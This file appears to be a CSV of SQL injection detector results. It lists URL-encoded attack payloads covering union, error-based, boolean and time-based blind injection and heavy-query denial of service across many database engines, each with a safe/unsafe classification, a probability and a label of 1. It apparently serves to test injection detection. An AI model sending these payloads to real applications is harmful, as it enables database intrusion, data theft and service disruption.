request_id,url,payload,classification,probability,label
5e871c42,,1%20where%202238%3D2238%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,unsafe,1.0,1
ab7c652a,,1%22%29%20as%20assu%20where%207521%3D7521%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,1.0,1
a955a514,,1%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%23%20sfup,unsafe,1.0,1
d64c2437,,1%22%20where%204450%3D4450%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,unsafe,1.0,1
5e4a3634,,1%22%29%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%22xccy%22%3D%22xccy,unsafe,1.0,1
c09933e8,,-8966%22%29%29%29%20or%201628%3D2712,unsafe,1.0,1
cf32f77a,,1%25%22%29%29%29%3Bbegin%20user_lock.sleep%285%29%3B%20end--,safe,0.12530768853685134,1
43f7d576,,1%27%29%20as%20mgko%20where%201828%3D1828%20and%20make_set%288403%3D8403%2C8899%29--,unsafe,1.0,1
d57b917a,,-8828%29%29%20as%20ospo%20where%202141%3D2141%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%,unsafe,1.0,1
0aec95c4,,%28select%20%28case%20when%20%289856%3D9856%29%20then%20sleep%285%29%20else%209856%2A%28select%209856%20from%20information_schema.character_sets%29%20end%29%29,unsafe,1.0,1
79cfb1b4,,-3443%22%29%29%20union%20all%20select%204043%2C4043%2C4043%2C4043%2C4043%2C4043%2C4043%23,unsafe,1.0,1
bb2e7a63,,1%29%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%286829%3D6829,unsafe,1.0,1
905d93c7,,1%22%29%29%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%28%28%28%22mmsh%22%3D%22mmsh,unsafe,1.0,1
be31afae,,1%22%29%20as%20ckoi%20where%204674%3D4674%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
573727b6,,1%22%29%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,unsafe,1.0,1
cb43a7a4,,-3598%29%20union%20all%20select%202264%23,unsafe,1.0,1
a86f96e2,,1%27%7C%7C%28select%20%27zrea%27%20from%20dual%20where%201223%3D1223%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,unsafe,1.0,1
e5cc5406,,1%25%22%29%29%29%20and%207758%3D4792%20and%20%28%28%28%22%25%22%3D%22,unsafe,1.0,1
45b708ff,,1%25%22%29%20rlike%20sleep%285%29%20and%20%28%22%25%22%3D%22,unsafe,1.0,1
b1fd245b,,-2783%25%27%29%29%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%200%,unsafe,1.0,1
5ac6829e,,1%29%20where%206884%3D6884%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--,unsafe,1.0,1
34ed9491,,1%25%27%29%29%20and%20elt%283114%3D3114%2Csleep%285%29%29%23,unsafe,1.0,1
d13aba3b,,1%27%7C%7C%28select%20%27bzxa%27%20where%206320%3D6320%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%7C%7C%27,unsafe,1.0,1
74f3070d,,1%25%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
cba1557b,,-3750%27%2B%28select%20alpu%20where%203911%3D3911%20order%20by%201--,unsafe,1.0,1
9e5678ce,,-3997%27%2B%28select%20%27avjk%27%20where%201917%3D1917%20union%20all%20select%201917%2C1917%2C1917--,unsafe,1.0,1
211a9c10,,1%27%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29%20and%20%27yfvu%27%20like%20%27yfvu,unsafe,1.0,1
3eb8eaeb,,1%27%29%3Bselect%20case%20when%208975%3D2352%20then%201%20else%20null%20end--,safe,0.0313831261871425,1
80e212ac,,1%27%20where%205060%3D5060%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,unsafe,1.0,1
3c878863,,1%27%29%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%28%28%27ywxe%27%20like%20%27ywxe,unsafe,1.0,1
4a7299e4,,1%27%7C%7C%28select%20%27yhpe%27%20where%208010%3D8010%20rlike%20%28select%20%28case%20when%20%287910%3D3752%29%20then%201%20else%200x28%20end%29%29%29%7C%7C%27,unsafe,1.0,1
ea5c9e76,,1%22%29%29%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%28%28%22dwcy%22%3D%22dwcy,unsafe,1.0,1
e548073f,,1%22%29%20where%208612%3D8612%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,unsafe,1.0,1
22797847,,1%22%29%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,unsafe,1.0,1
84b3cc92,,1%2C%28select%20%28case%20when%20%285433%3D5433%29%20then%201%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual%29,unsafe,1.0,1
90553b77,,1%27%29%29%29%20and%209254%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,unsafe,1.0,1
f654a3b5,,1%22%20where%204082%3D4082%20and%20elt%285699%3D1432%2C1432%29--,unsafe,1.0,1
de2a2723,,1%25%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
5a1343e7,,1%27%20where%209602%3D9602%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29--,unsafe,1.0,1
a65defc3,,1%29%29%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%288018%3D8018,unsafe,1.0,1
7bcef622,,-5174%27%29%29%29%20or%20make_set%289515%3D7938%2C7938%29%20and%20%28%28%28%27ygee%27%3D%27ygee,unsafe,1.0,1
a9a16256,,1%25%27%29%29%29%3Bselect%20%28case%20when%20%284660%3D4660%29%20then%204660%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,unsafe,1.0,1
6cc21a88,,1%22%29%29%20as%20vgsb%20where%204747%3D4747%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,unsafe,1.0,1
848f1b79,,1%22%29%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%22dbxi%22%20like%20%22dbxi,unsafe,1.0,1
1e789c19,,1%27%20where%208537%3D8537%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29--,unsafe,1.0,1
70ee3126,,1%29%29%20order%20by%201--,unsafe,1.0,1
0f67b7aa,,1%22%29%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%28%22dksc%22%3D%22dksc,unsafe,1.0,1
9aca579e,,1%25%27%20rlike%20sleep%285%29%23,safe,0.14339633666361903,1
ffb44af4,,-5774%27%20where%203632%3D3632%20or%20%283177%3D4222%29%2A4222--,unsafe,1.0,1
cc19a844,,-1033%20union%20all%20select%208731%2C8731%2C8731%2C8731%2C8731%2C8731--,unsafe,1.0,1
6c86be18,,1%29%29%29%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,unsafe,1.0,1
2cd5350b,,1%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%284614%3D4614,unsafe,1.0,1
56d37ed7,,-1277%22%29%20where%206622%3D6622%20or%203038%3D3038,unsafe,1.0,1
6c208a13,,1%27%29%29%20as%20xuab%20where%204369%3D4369%20union%20all%20select%20null%2Cnull%2Cnull--,unsafe,1.0,1
1a877e90,,1%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29,unsafe,1.0,1
57d26b8a,,1%27%20in%20boolean%20mode%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%23,unsafe,1.0,1
10f88e12,,1%27%2B%28select%20dyfw%20where%207743%3D7743%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%29%2B%27,unsafe,1.0,1
5428f427,,-4308%27%29%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bc,unsafe,1.0,1
2932bca3,,1%27%29%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29,unsafe,1.0,1
5a23880c,,1%22%29%29%29%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual%20and%20%28%28%28%22oiuw%22%3D%22oiuw,unsafe,1.0,1
0c38ed59,,1%29%29%20as%20pjkd%20where%201105%3D1105%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--,unsafe,1.0,1
dddbc35b,,-7083%20union%20all%20select%207705%2C7705%2C7705%2C7705%2C7705%23,unsafe,1.0,1
e59e668e,,-8783%27%29%29%20union%20all%20select%204834%2C4834%2C4834%2C4834%2C4834%2C4834%2C4834%2C4834%2C4834--,unsafe,1.0,1
2c8c5db7,,1%22%20where%201166%3D1166%3Bselect%20pg_sleep%285%29--,unsafe,1.0,1
a9148b06,,-8999%27%29%29%29%20or%206872%3D6872%20and%20%28%28%28%27jare%27%3D%27jare,unsafe,1.0,1
428eb8a1,,1%27%29%29%3Bselect%20%28case%20when%20%282774%3D5503%29%20then%202774%20else%202774%2A%28select%202774%20from%20information_schema.character_sets%29%20end%29%23,unsafe,1.0,1
9cc724db,,-4291%22%29%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28,unsafe,1.0,1
8592c0da,,-9054%29%29%29%20or%209323%3D9323%23,unsafe,1.0,1
e3933110,,1%29%29%20as%20myyh%20where%205116%3D5116%20or%207427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29--,unsafe,1.0,1
0527f4a2,,-9751%22%29%29%29%20or%205929%3D3884--,unsafe,1.0,1
53ec5939,,1%27%29%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%28%28%27wusq%27%3D%27wusq,unsafe,1.0,1
63c21291,,1%27%29%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%28%27ootz%27%20like%20%27ootz,unsafe,1.0,1
86b0f505,,1%25%22%29%20and%20%28select%209067%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289067%3D9067%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%22%25%22%3D%22,unsafe,1.0,1
724d22a1,,1%22%20and%205205%3D9975%23,unsafe,1.0,1
1d2b2739,,1%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29--%20ivku,unsafe,1.0,1
82e8eb25,,1%22%20and%209198%3D9198--,unsafe,1.0,1
29058983,,1%22%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%22gknn%22%20like%20%22gknn,unsafe,1.0,1
794b069d,,1%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%289112%3D9112,unsafe,1.0,1
2ff11c14,,-8812%20or%206872%3D6872%23%20dflr,unsafe,1.0,1
8e3543fb,,-4617%27%29%29%29%20or%209323%3D9323%23,unsafe,1.0,1
5084acdd,,-4148%25%22%29%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%28%22%25%22%3D%22,unsafe,1.0,1
2f64e6c1,,1%25%27%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%27%25%27%3D%27,unsafe,1.0,1
2ac040de,,1%22%29%29%20as%20jmoy%20where%209676%3D9676%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,1.0,1
c4c22103,,-9672%25%22%29%29%29%20order%20by%201%23,unsafe,1.0,1
2455abe7,,1%22%29%20where%206255%3D6255%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29--,unsafe,1.0,1
58969a11,,1%27%29%20as%20jwvp%20where%205231%3D5231%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,unsafe,1.0,1
d6a8ed4d,,1%27%2B%28select%20%27gprq%27%20where%208928%3D8928%3Bwaitfor%20delay%20%270%3A0%3A5%27--,unsafe,1.0,1
e7f32ee4,,1%27%29%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29,unsafe,1.0,1
0c4ffdb1,,-4571%27%20union%20all%20select%203227%2C3227%2C3227%2C3227--,unsafe,1.0,1
ab7df637,,-3169%22%20order%20by%201%23,unsafe,1.0,1
7dcb8195,,-4929%22%20where%206381%3D6381%20or%208571%3D8571--,unsafe,1.0,1
7af3d3c2,,1%22%29%20as%20aifd%20where%205962%3D5962%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,unsafe,1.0,1
ef31f3f2,,1%27%29%29%29%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%28%28%27bmzj%27%20like%20%27bmzj,unsafe,1.0,1
d9d92aa7,,1%27%20where%203337%3D3337%20and%208403%3D5760,unsafe,1.0,1
3d5b3ec5,,1%27%20in%20boolean%20mode%29%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,unsafe,1.0,1
93d91ccb,,1%27%7C%7C%28select%20%27xuou%27%20from%20dual%20where%207681%3D7681%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%29%7C%7C%27,unsafe,1.0,1
03fb988c,,-9398%27%20union%20all%20select%203998%2C3998%2C3998%2C3998%2C3998%2C3998%2C3998%2C3998%2C3998%23,unsafe,1.0,1
66c2d81f,,1%27%2B%28select%20iwbs%20where%204939%3D4939%3Bbegin%20user_lock.sleep%285%29%3B%20end--,unsafe,1.0,1
fdba72f3,,-8080%27%29%29%20order%20by%201%23,unsafe,1.0,1
cee3f011,,1%27%2C%28select%20%28case%20when%20%282073%3D5314%29%20then%201%20else%201/%28select%200%29%20end%29%29,safe,0.0641202371930777,1
96776d71,,1%27%29%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%27novq%27%3D%27novq,unsafe,1.0,1
c1189828,,1%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
e94c12f8,,1%27%29%20as%20bfgl%20where%208959%3D8959%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
c5dccb7d,,1%22%29%29%20and%208329%3D5584%23,unsafe,1.0,1
f625b488,,1%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--%20mkoo,unsafe,1.0,1
fe805349,,1%27%29%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%28%27gfln%27%3D%27gfln,unsafe,1.0,1
797765b7,,-5245%22%29%29%29%20union%20all%20select%208106%2C8106%2C8106%23,unsafe,1.0,1
e971e8b6,,-5606%29%29%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,unsafe,1.0,1
37f637f1,,1%27%29%20as%20jwch%20where%204609%3D4609%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,unsafe,1.0,1
9da630f6,,1%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%23%20zcyc,unsafe,1.0,1
9047eccd,,-1917%22%29%20or%208571%3D8571--,unsafe,1.0,1
6e3c1f7f,,-6815%20where%207609%3D7609%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,unsafe,1.0,1
47401105,,1%29%20where%204992%3D4992%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,unsafe,1.0,1
9e3b8256,,1%27%7C%7C%28select%20%27gmkp%27%20where%206016%3D6016%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%7C%7C%27,unsafe,1.0,1
a880a0ed,,1%27%20where%205801%3D5801%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29--,unsafe,1.0,1
fb5717cd,,-8513%27%20union%20all%20select%207414--,unsafe,1.0,1
e4a2669e,,-9736%27%20or%20make_set%287311%3D2067%2C2067%29%20and%20%27czdt%27%20like%20%27czdt,unsafe,1.0,1
13407e72,,1%29%20as%20jmib%20where%208130%3D8130%20rlike%20%28select%20%28case%20when%20%287885%3D3932%29%20then%201%20else%200x28%20end%29%29--,unsafe,1.0,1
a1d83583,,1%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29,unsafe,1.0,1
fe3af759,,-3587%27%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113,unsafe,1.0,1
0832565e,,-6086%22%20union%20all%20select%208700%2C8700%2C8700%2C8700--,unsafe,1.0,1
343868c1,,1%27%29%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%27aovy%27%3D%27aovy,unsafe,1.0,1
cf5e8ac8,,1%27%29%29%20and%20elt%284460%3D2665%2C2665%29%20and%20%28%28%27qmzu%27%3D%27qmzu,unsafe,1.0,1
667b0d7d,,1%27%2B%28select%20%27yjpp%27%20where%208966%3D8966%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%2B%27,unsafe,1.0,1
0803685b,,-6122%22%29%20union%20all%20select%206578%2C6578--,unsafe,1.0,1
06498981,,-8792%20union%20all%20select%201246%2C1246%2C1246%2C1246%2C1246%2C1246%2C1246--,unsafe,1.0,1
d443a3ff,,-9003%22%29%29%20union%20all%20select%209721%2C9721--,unsafe,1.0,1
6f1f92e5,,1%25%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
bc4a185a,,1%27%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%28%27iifh%27%3D%27iifh,unsafe,1.0,1
72715b54,,1%27%29%29%29%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%28%28%28%27zhhf%27%20like%20%27zhhf,unsafe,1.0,1
45803270,,1%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
e99282c8,,1%27%29%3Bselect%20sleep%285%29%20and%20%28%27qcsv%27%3D%27qcsv,unsafe,1.0,1
c3986c21,,-2417%29%20union%20all%20select%202169%2C2169%2C2169%2C2169%2C2169%2C2169%2C2169%2C2169%2C2169%2C2169%23,unsafe,1.0,1
97ade03c,,1%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,safe,0.0453988738794048,1
148204b5,,1%27%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%27iwkg%27%3D%27iwkg,unsafe,1.0,1
cbadde81,,1%27%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%28%27jvll%27%20like%20%27jvll,unsafe,1.0,1
23bb0ee0,,1%25%27%29%29%29%20and%202444%3D9282%23,unsafe,1.0,1
ace02336,,1%27%29%20as%20irnj%20where%207274%3D7274%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29--,unsafe,1.0,1
81cee60e,,-8124%29%20union%20all%20select%207251%2C7251%2C7251%23,unsafe,1.0,1
ac14d6e1,,-4669%29%20or%202452%3D1601%23,unsafe,1.0,1
fd779cd6,,1%22%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,1.0,1
